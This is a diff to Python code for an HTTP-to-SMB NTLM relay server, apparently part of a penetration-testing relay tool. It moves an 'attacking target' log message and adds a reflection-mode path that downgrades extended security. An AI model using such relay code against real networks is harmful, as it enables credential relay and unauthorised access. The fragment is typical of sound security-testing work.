@@ -220,6 +220,7 @@ class HTTPRelayServer(Thread):
         def __init__(self,request, client_address, server):
             self.server = server
             self.protocol_version = 'HTTP/1.1'
+            print "[*] HTTPD: Received connection from %s, attacking target %s" % (client_address[0] ,self.server.target)
             SimpleHTTPServer.SimpleHTTPRequestHandler.__init__(self,request, client_address, server)
 
         def handle_one_request(self):
@@ -244,7 +245,6 @@ class HTTPRelayServer(Thread):
             self.end_headers()
 
         def do_GET(self):
-            print "[*] HTTP: Received connection from %s, attacking target %s" % (self.client_address[0] ,self.server.target)
             messageType = 0
             if self.headers.getheader('Authorization') == None:
                 self.do_AUTHHEAD(message = 'NTLM')
@@ -262,8 +262,11 @@ class HTTPRelayServer(Thread):
             if messageType == 1:
                 if self.server.mode.upper() == 'REFLECTION':
                     self.target = self.client_address[0]
+                    print "[*] Downgrading to standard security"
+                    extSec = False
                 else:
                     self.target = self.server.target
+                    extSec = True
 
                 try:
                     self.client = SMBClient(self.target, extended_security = True)
